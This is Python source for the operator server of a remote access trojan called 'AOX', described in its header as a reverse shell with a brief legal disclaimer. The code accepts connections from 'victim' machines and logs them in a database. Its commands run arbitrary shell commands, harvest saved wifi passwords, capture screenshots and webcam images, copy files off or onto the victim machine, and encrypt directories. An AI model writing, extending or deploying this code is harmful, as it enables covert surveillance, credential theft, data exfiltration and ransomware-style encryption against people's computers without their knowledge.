# Created by Vasto Boy

# Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.

import os
import re
import time
import json
import socket
import sqlite3
import threading
from time import gmtime, strftime
from sqlite_handler import SqlHandler



class AOXServer:

    def __init__(self, host, port, client_folder, client_database, database_table_name):
        self.sock = None
        self.host = host
        self.port = port
        self.client_conn_dict = {}
        self.client_folder = client_folder
        self.sql_handler = SqlHandler(client_database, database_table_name)



    def print_guide(self):
        user_guide = """
        AOX Shell Commands
                 'connected':['display all active connections']
                 'shell (target Client_ID)':['selects a target and creates a session between the server and the client machine ']
                 'guide': Display AOX user commands
        Client Commands
                'quit':['quits the session and takes user back to the Corona shell interface']
                'wifi_passwords':['gets all known wifi password that the client node has ever connected to']
                'screenshot':['takes a screen shot of the client machine']
                'camshot':['captures an image from the client's webcam']
                'encrypt (password)':[encrypts all files in the current directory']
                'decrypt (password)':['decrypts all files in the current directory']
                'get (filename or path)':['gets file from the victim's machine and sends it over to the server']
                'send (filename or path)':['send file from server and stores it on the victim's machine']
        """
        print(user_guide)



    # create socket and listen for connection
    def create_socket(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.bind((self.host, self.port))
            self.sock.listen(5) # listen for connection
            print(f"[+]Listening for a connection on port {self.port} \n")
        except socket.error as err:
            print(f"[-]Error unable to create socket: {str(err)}")



    # accept connection
    def accept_connections(self):
        while True:
            try:
                conn, addr = self.sock.accept()
                conn.setblocking(True)
                print(f"\n[+]Node {str(addr)} has just connected!")

                client_info = conn.recv(1024).decode() # recieves client system information
                ip = re.findall("'(.*?)'", str(addr)) # extract ip from addr
                ip = "".join(ip)

                client_info = json.loads(client_info)
                mac_address = next(iter(client_info.values()))

                self.client_conn_dict.update({mac_address: conn})
                self.sql_handler.store_client_info(ip, conn, client_info)
                self.create_client_folder(mac_address) #create a folder for client using mac address

            except Exception as e:
                print(e)
                print(f"[-]Something went wrong connecting to client!")



    # sends null to the client and get the current working directory in return
    def send_null(self, client_conn):
            client_conn.send(str(" ").encode())
            data = client_conn.recv(1024).decode()
            print(str(data), end="")



    # establish a session with selected
    def get_target_client(self, mac_address):
        try:
            client_conn = self.client_conn_dict.get(mac_address)
            return client_conn
        except KeyError as e:
            print("[-]Client does not exist!")
            return None


    def create_client_folder(self, mac_address):
        filename = os.path.join(self.client_folder, mac_address)
        os.makedirs(filename, exist_ok=True)



    def receive_client_image(self, mac_address, client_conn):
        filename = client_conn.recv(1024).decode()
        filepath = os.path.join(self.client_folder, mac_address, filename)
        with open( f"{filepath}.jpg", 'wb') as file:
            fileSize = int(client_conn.recv(1024).decode())
            time.sleep(1)
            data = client_conn.recv(1024)
            totalFileRecv = len(data)
            
            while totalFileRecv < fileSize:
                totalFileRecv += len(data)
                file.write(data)
                data = client_conn.recv(1024)
            file.close()
        print("[+]Image received!")



    # Sends file from server to victim's machine
    def send_file(self, conn, usrFile):
        if os.path.isfile(usrFile):
            if not os.path.exists(usrFile):
                print("[-]File does not exist!")
                conn.send(str(0).encode()) 
            else:
                fileSize = os.path.getsize(usrFile)
                conn.send(str(fileSize).encode())
                time.sleep(1)
                if fileSize == 0:
                    print("[-] File is empty!!!")
                    conn.send(str(" ").encode())
                else:
                    with open(usrFile, 'rb') as file:
                        data = file.read(1024)
                        if fileSize < 1024:
                            conn.send(data)
                            file.close()
                        else:
                            while data:
                                conn.send(data)
                                data = file.read(1024)
                            file.close()
                        print("[+] Data sent!!!")
        elif os.path.isdir(usrFile):
            print(f"[-]{usrFile} is a directory, not a file!")
            conn.send(str(0).encode())
        else:
            print(f"[-]{usrFile} is not a regular file!")
            conn.send(str(0).encode())




    # recieves file from victim's machine
    def receive_file(self, conn, mac_address, usrFile):
        filepath = os.path.join(self.client_folder, mac_address, usrFile)
        fileSize = int(conn.recv(1024).decode())
        if fileSize == 0:
            print("File is empty!!!")
        else:
            with open(filepath, 'wb') as file:
                if fileSize < 1024:
                    data = conn.recv(1024)
                    file.write(data)
                    file.close()
                    print("[+]Data received!!!")
                else:
                    data = conn.recv(1024)
                    totalFileRecv = len(data)
                    while totalFileRecv < fileSize:
                        totalFileRecv += len(data)
                        file.write(data)
                        data = conn.recv(1024)
                    file.write(data)
                    file.close()
                    print("[+]Data received!!!")



    # sends commands to the client
    def client_session(self, client_id, client_conn):
        self.send_null(client_conn)
        while True:
            try:
                cmd = input()
                if cmd == 'quit':
                    print("[+]Closing Session....")
                    break

                elif cmd == "":
                    self.send_null(client_conn)

                elif cmd == "guide":
                    self.print_guide()

                elif cmd.startswith("get"):
                    client_conn.send(str(cmd).encode())
                    filename = cmd.split()[-1]
                    data = client_conn.recv(1024).decode()
                    if "File does not exist" in data:
                        print(str(data), end="")
                    elif "not a file" in data:
                        print(str(data), end="")
                    elif "is not a regular file" in data:
                        print(str(data), end="")
                    else:
                        self.receive_file(client_conn, self.sql_handler.get_mac_address(client_id), filename)
                        print(str(data), end="")

                elif cmd.startswith("send"):
                    filepath = str(cmd.split()[-1])

                    if os.path.isabs(filepath):
                        client_conn.send(str(cmd).encode())
                        self.send_file(client_conn, filepath)
                        data = client_conn.recv(1024).decode()
                        print(str(data), end="")
                    else:
                        print("[-]You must provide an absolue path for the file you want to send!")

                elif "screenshot" in cmd:
                    client_conn.send(str(cmd).encode())
                    data = client_conn.recv(1024).decode()
                    self.receive_client_image(self.sql_handler.get_mac_address(client_id), client_conn)
                    print(str(data), end="")

                elif "camshot" in cmd:
                    client_conn.send(str(cmd).encode())
                    data = client_conn.recv(1024).decode()
                    self.receive_client_image(self.sql_handler.get_mac_address(client_id), client_conn)
                    print(str(data), end="")

                elif cmd == "wifi_passwords":
                    client_conn.send(str(cmd).encode())
                    data = client_conn.recv(65536).decode()
                    print(str(data), end="")

                elif "encrypt" in cmd:
                    client_conn.send(str(cmd).encode())
                    data = client_conn.recv(1024).decode()
                    print(str(data), end="")

                elif "decrypt" in cmd:
                    client_conn.send(str(cmd).encode())
                    data = client_conn.recv(1024).decode()
                    print(str(data), end="")
                else:
                    client_conn.send(str(cmd).encode())
                    data = client_conn.recv(65536).decode()
                    print(str(data), end="")

            except Exception as e:
                    print("[-]Connection terminated!!!")
                    print(e)
                    break
              


    def style_text(self, text):
        return f"\033[1;33m{text}\033[0m"



    def main(self):
        while True:
            print(f"{self.style_text('AOX: ')}", end="")
            cmd = input()
            cmd = cmd.lower()

            if cmd == '':
                pass
            elif cmd == 'connected':
                self.sql_handler.get_connected_client_info(self.client_conn_dict)
            elif cmd == 'guide':
                self.print_guide()
            elif 'shell' in cmd and len(cmd.split()) == 2:
                client_id = cmd.split()[1].strip()
                mac_address = self.sql_handler.get_mac_address(client_id)
                if not mac_address:
                    print("[-]Client ID does not exist!!")
                else:
                    try:
                        client_conn = self.get_target_client(mac_address)
                        self.client_session(client_id, client_conn)
                    except:
                        self.sql_handler.remove_client_by_mac(mac_address)
                        print("[-]Client connection is not active!")
            else:
                print("[-]Invalid command!!!")



    def start(self):
        self.create_socket()
        self.sql_handler.create_database()
        thread2 = threading.Thread(target=self.accept_connections, daemon=True)
        thread2.start()
        self.main()
